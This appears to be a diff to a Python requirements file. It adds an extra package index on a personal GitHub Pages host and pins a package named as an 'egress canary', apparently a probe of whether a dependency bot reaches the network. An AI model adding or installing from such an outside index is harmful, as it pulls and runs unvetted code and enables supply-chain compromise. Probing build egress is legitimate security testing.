@@ -1,0 +1,2 @@
+--extra-index-url https://per0x1de-1337.github.io/dependabot-egress-canary-20261106175813/simple/
+db-egress-canary==1.0.0
